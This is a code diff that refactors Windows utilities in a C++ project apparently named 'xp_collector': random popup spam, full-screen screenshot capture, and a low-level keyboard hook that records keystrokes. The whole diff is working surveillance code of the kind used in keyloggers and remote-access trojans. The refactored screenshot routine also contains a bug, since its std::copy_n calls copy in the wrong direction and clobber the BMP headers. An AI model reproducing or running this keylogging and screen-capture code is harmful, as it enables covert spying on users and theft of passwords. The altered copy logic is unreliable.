@@ -7,13 +7,13 @@
 
 #include "AutoHandle.h"
 #include "WinUtils.h"
-#include "Strings.h"
+#include "Utils/Strings.h"
+#include "Utils/Uuid.h"
 using namespace xp_collector;
 
 bool windows::do_popup(const std::string& window_name, const std::string& text, const DWORD flags)
 {
-	const auto result = MessageBoxA(GetForegroundWindow(), text.c_str(), window_name.c_str(), flags);
-	if (!result) {
+	if (!MessageBoxA(GetForegroundWindow(), text.c_str(), window_name.c_str(), flags)) {
 		return false;
 	}
 	return true;
@@ -21,20 +21,17 @@ bool windows::do_popup(const std::string& window_name, const std::string& text, 
 
 void windows::do_popups(const size_t count, const std::string& window_name, const std::string& text, const DWORD flags)
 {
-	// Seed the random number generator
-	std::srand(static_cast<unsigned int>(std::time(nullptr)));
-
 	// Get the screen dimensions
-	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
-	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+	const int screen_width = GetSystemMetrics(SM_CXSCREEN);
+	const int screen_height = GetSystemMetrics(SM_CYSCREEN);
 
 	for (size_t i = 0; i < count; ++i) {
 		// Generate random positions for the message box
-		int x_pos = std::rand() % (screenWidth - 200); // 200 is an arbitrary width of the MessageBox
-		int y_pos = std::rand() % (screenHeight - 100); // 100 is an arbitrary height of the MessageBox
+		int x_pos = uuid::rand_int(0, screen_width - 200); // 200 is an arbitrary width of the MessageBox
+		int y_pos = uuid::rand_int(0, screen_height - 100); // 100 is an arbitrary height of the MessageBox
 
 		// Create the message box in a new thread to avoid blocking the loop
-		std::thread t([window_name, text, flags, x_pos, y_pos](LPVOID param) -> DWORD
+		std::thread t([window_name, text, flags, x_pos, y_pos](const LPVOID param) -> DWORD
 		              {
 			              RECT rect;
 			              GetWindowRect(static_cast<HWND>(param), &rect);
@@ -56,20 +53,20 @@ void windows::do_popups(const size_t count, const std::string& window_name, cons
 std::string windows::take_screenshot()
 {
 	// Get the desktop device context (DC) of the entire virtual screen
-	HDC h_screen_dc = GetDC(nullptr);
-	HDC h_memory_dc = CreateCompatibleDC(h_screen_dc);
+	const HDC h_screen_dc = GetDC(nullptr);
+	const HDC h_memory_dc = CreateCompatibleDC(h_screen_dc);
 
 	// Get the dimensions of the virtual screen (covers all monitors)
-	int screen_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-	int screen_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-	int screen_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
-	int screen_top = GetSystemMetrics(SM_YVIRTUALSCREEN);
+	const int screen_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+	const int screen_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+	const int screen_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
+	const int screen_top = GetSystemMetrics(SM_YVIRTUALSCREEN);
 
 	// Create a compatible bitmap from the screen DC
-	HBITMAP h_bitmap = CreateCompatibleBitmap(h_screen_dc, screen_width, screen_height);
+	const HBITMAP h_bitmap = CreateCompatibleBitmap(h_screen_dc, screen_width, screen_height);
 
 	// Select the compatible bitmap into the compatible memory DC
-	auto h_old_bitmap = static_cast<HBITMAP>(SelectObject(h_memory_dc, h_bitmap));
+	const auto h_old_bitmap = static_cast<HBITMAP>(SelectObject(h_memory_dc, h_bitmap));
 
 	// Bit block transfer into our compatible memory DC
 	BitBlt(h_memory_dc, 0, 0, screen_width, screen_height, h_screen_dc, screen_left, screen_top, SRCCOPY);
@@ -79,7 +76,7 @@ std::string windows::take_screenshot()
 	GetObject(h_bitmap, sizeof(BITMAP), &bmp);
 
 	// Calculate the stride (row size) of the bitmap
-	int row_size = ((bmp.bmWidth * bmp.bmBitsPixel + 31) / 32) * 4;
+	const int row_size = ((bmp.bmWidth * bmp.bmBitsPixel + 31) / 32) * 4;
 
 	// Bitmap file header
 	BITMAPFILEHEADER file_header;
@@ -109,12 +106,13 @@ std::string windows::take_screenshot()
 	std::string bmp_buffer(file_header.bfSize, '\0');
 
 	// Copy headers
-	memcpy(bmp_buffer.data(), &file_header, sizeof(BITMAPFILEHEADER));
-	memcpy(bmp_buffer.data() + sizeof(BITMAPFILEHEADER), &info_header, sizeof(BITMAPINFOHEADER));
+	std::copy_n(bmp_buffer.data(), sizeof(BITMAPFILEHEADER), reinterpret_cast<char*>(&file_header));
+	std::copy_n(bmp_buffer.data() + sizeof(BITMAPFILEHEADER), sizeof(BITMAPINFOHEADER),
+	            reinterpret_cast<char*>(&info_header));
 
 	// Copy bitmap data
 	GetDIBits(h_memory_dc, h_bitmap, 0, bmp.bmHeight, bmp_buffer.data() + file_header.bfOffBits,
-	          (BITMAPINFO*)&info_header, DIB_RGB_COLORS);
+	          reinterpret_cast<BITMAPINFO*>(&info_header), DIB_RGB_COLORS);
 
 	// Cleanup
 	SelectObject(h_memory_dc, h_old_bitmap);
@@ -126,11 +124,10 @@ std::string windows::take_screenshot()
 	return bmp_buffer;
 }
 
-BOOL windows::get_message_with_timeout(MSG* msg, unsigned int to)
+BOOL windows::get_message_with_timeout(MSG* msg, const unsigned int timeout)
 {
-	BOOL res;
-	UINT_PTR timer_id = SetTimer(nullptr, 0, to, nullptr);
-	res = GetMessage(msg, nullptr, 0, 0);
+	const UINT_PTR timer_id = SetTimer(nullptr, 0, timeout, nullptr);
+	const BOOL res = GetMessage(msg, nullptr, 0, 0);
 	KillTimer(nullptr, timer_id);
 	if (!res)
 		return FALSE;
@@ -139,33 +136,32 @@ BOOL windows::get_message_with_timeout(MSG* msg, unsigned int to)
 	return TRUE;
 }
 
-std::string windows::log_keys(unsigned int duration_seconds)
+std::string windows::log_keys(const unsigned int duration_seconds)
 {
-	key_logger_key_codes.clear();
-	HHOOK hook_handle = SetWindowsHookEx(WH_KEYBOARD_LL, log_keys_hook, nullptr, 0);
+	g_key_logger_key_codes.clear();
+	const HHOOK hook_handle = SetWindowsHookEx(WH_KEYBOARD_LL, log_keys_hook, nullptr, 0);
 
 	MSG msg;
 	get_message_with_timeout(&msg, duration_seconds * 1000);
 
 	UnhookWindowsHookEx(hook_handle);
 
-	std::string result = "";
-	for (const DWORD val : key_logger_key_codes) {
+	std::string result;
+	for (const DWORD val : g_key_logger_key_codes) {
 		result.append(std::string(1, static_cast<char>(val)));
 	}
 	return result;
 }
 
-LRESULT CALLBACK windows::log_keys_hook(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK windows::log_keys_hook(const int n_code, const WPARAM w_param, const LPARAM l_param)
 {
-	if (nCode == HC_ACTION) {
-		switch (wParam) {
+	if (n_code == HC_ACTION) {
+		switch (w_param) {
 		case WM_KEYDOWN:
 		case WM_SYSKEYDOWN:
-			auto p = (PKBDLLHOOKSTRUCT)lParam;
-			const auto key_code = p->vkCode;
-			key_logger_key_codes.push_back(key_code);
+			g_key_logger_key_codes.push_back(reinterpret_cast<PKBDLLHOOKSTRUCT>(l_param)->vkCode);
 			break;
+		default: break;
 		}
 	}
 	return false; // don't consume event
